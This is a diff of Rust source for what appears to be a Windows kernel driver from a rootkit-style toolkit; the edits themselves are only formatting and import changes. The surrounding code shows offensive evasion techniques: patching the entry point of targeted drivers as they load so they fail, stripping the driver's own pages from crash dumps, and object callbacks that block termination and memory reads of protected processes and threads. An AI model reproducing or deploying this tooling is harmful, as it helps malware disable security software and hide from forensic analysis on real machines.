@@ -1,24 +1,23 @@
 #![cfg_attr(not(feature = "mapper"), allow(non_snake_case))]
 
+use alloc::{string::String, vec::Vec};
 use core::{
     ffi::c_void,
     ptr::{null_mut, addr_of_mut}
 };
 
-use alloc::{string::String, vec::Vec};
+use log::error;
 use spin::{lazy::Lazy, mutex::Mutex};
 use wdk_sys::{
     ntddk::*, *,
     _KBUGCHECK_CALLBACK_REASON::KbCallbackRemovePages,
 };
-
 use shadowx::{uni, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, mdl::Mdl};
 use shadowx::{
     KBUGCHECK_REASON_CALLBACK_RECORD, 
     KeRegisterBugCheckReasonCallback,
     KeDeregisterBugCheckReasonCallback
 };
-
 use shadowx::registry::callback::{
     CALLBACK_REGISTRY, 
     registry_callback
@@ -96,7 +95,7 @@ impl<'a> Callback<'a> {
 
         let status = unsafe { ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_THREAD)) };
         if !NT_SUCCESS(status) {
-            log::error!("ObRegisterCallbacks [{}] Failed With Status: {}", line!(), status);
+            error!("ObRegisterCallbacks [{}] Failed With Status: {}", line!(), status);
         }
 
         status
@@ -122,7 +121,7 @@ impl<'a> Callback<'a> {
 
         let status = unsafe { ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_PROCESS)) };
         if !NT_SUCCESS(status) {
-            log::error!("ObRegisterCallbacks [{}] Failed With Status: {}", line!(), status);
+            error!("ObRegisterCallbacks [{}] Failed With Status: {}", line!(), status);
         }
 
         status
@@ -144,7 +143,7 @@ impl<'a> Callback<'a> {
         };
 
         if !NT_SUCCESS(status) {
-            log::error!("CmRegisterCallbackEx Failed With Status: {status}");
+            error!("CmRegisterCallbackEx Failed With Status: {status}");
         }
 
         status
@@ -185,8 +184,7 @@ impl<'a> Callback<'a> {
 ///
 /// This function modifies the crash dump behavior by marking specific memory
 /// regions to be removed from the crash dump.
-extern "C" 
-fn bug_check_remove_pages(
+extern "C" fn bug_check_remove_pages(
     _Reason: KBUGCHECK_CALLBACK_REASON,
     _Record: *mut KBUGCHECK_REASON_CALLBACK_RECORD,
     ReasonSpecificData: *mut c_void,
@@ -195,7 +193,7 @@ fn bug_check_remove_pages(
     unsafe {
         // Validate parameters
         if ReasonSpecificData.is_null() || DRIVER_BASE.is_null() || DRIVER_SIZE == 0 {
-            log::error!("Invalid Parameters");
+            error!("Invalid Parameters");
             return;
         }
 
@@ -210,7 +208,7 @@ fn bug_check_remove_pages(
 // Opcodes that will be entered to prevent the driver from being loaded
 const OPCODES: [u8; 6] = [
     0xB8, 0x01, 0x00, 0x00, 0xC0, // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
-	0xC3                         // ret
+	0xC3 // ret
 ];
 
 // Maximum number of drivers that can be protected
@@ -223,8 +221,7 @@ static TARGET_DRIVERS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::w
 ///
 /// This function intercepts image loading events and checks for images. 
 /// If detected, it modifies the image's entry point using an MDL (Memory Descriptor List).
-extern "C"
-fn image_notify_routine(
+extern "C" fn image_notify_routine(
     FullImageName: PUNICODE_STRING,
     ProcessId: HANDLE,
     ImageInfo: PIMAGE_INFO,
@@ -249,14 +246,15 @@ fn image_notify_routine(
         }
 
         // Locate the entry point of the image
-        let nt_header = ((*((*ImageInfo).ImageBase as *const IMAGE_DOS_HEADER)).e_lfanew as usize + (*ImageInfo).ImageBase as usize) as *const IMAGE_NT_HEADERS;
+        let nt_header = ((*((*ImageInfo).ImageBase as *const IMAGE_DOS_HEADER)).e_lfanew as usize 
+            + (*ImageInfo).ImageBase as usize) as *const IMAGE_NT_HEADERS;
         let entry_point = ((*ImageInfo).ImageBase as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut u8;
 
         // Use MDL to safely modify the memory at the entry point
         if let Some(mdl) = Mdl::new(entry_point, size_of_val(&OPCODES)) {
             mdl.copy(OPCODES.as_ptr(), size_of_val(&OPCODES));
         } else {
-            log::error!("MDL initialization failed.");
+            error!("MDL initialization failed.");
         }
     }
 }
@@ -327,15 +325,14 @@ static TARGET_PIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_
 
 pub mod process {
     use alloc::vec::Vec;
-    use super::TARGET_PIDS;
-    use common::structs::TargetProcess;
-    use wdk_sys::ntddk::PsGetProcessId;
+    use wdk_sys::{*, ntddk::PsGetProcessId};
     use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{Type, OB_PREOP_SUCCESS};
-    use wdk_sys::*;
     use shadowx::{
         PROCESS_CREATE_THREAD, PROCESS_TERMINATE, 
         PROCESS_VM_OPERATION, PROCESS_VM_READ,
     };
+    use super::TARGET_PIDS;
+    use common::structs::TargetProcess;
 
     /// Method for adding the list of processes that will have anti-kill / dumping protection.
     ///
@@ -411,8 +408,7 @@ pub mod process {
     /// # Returns
     ///
     /// * A status code indicating the success or failure of the operation.
-    pub unsafe extern "C" 
-    fn on_pre_open_process(
+    pub unsafe extern "C" fn on_pre_open_process(
         _registration_context: *mut core::ffi::c_void,
         info: *mut OB_PRE_OPERATION_INFORMATION,
     ) -> Type {
@@ -448,15 +444,11 @@ pub static mut CALLBACK_REGISTRATION_HANDLE_THREAD: *mut core::ffi::c_void = cor
 static TARGET_TIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TID)));
 
 pub mod thread {
-    use wdk_sys::ntddk::PsGetThreadId;
+    use alloc::vec::Vec;
+    use wdk_sys::{*, ntddk::PsGetThreadId};
     use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{Type, OB_PREOP_SUCCESS};
-    use wdk_sys::*;
+    use common::structs::TargetThread;
     use super::TARGET_TIDS;
-
-    use {
-        alloc::vec::Vec,
-        common::structs::TargetThread,
-    };    
     
     /// Method for adding the list of threads that will have anti-kill / dumping protection.
     ///
@@ -536,8 +528,7 @@ pub mod thread {
     /// # Returns
     ///
     /// * A status code indicating the success of the pre-operation.
-    pub unsafe extern "C" 
-    fn on_pre_open_thread(
+    pub unsafe extern "C" fn on_pre_open_thread(
         _registration_context: *mut core::ffi::c_void,
         info: *mut OB_PRE_OPERATION_INFORMATION,
     ) -> Type {
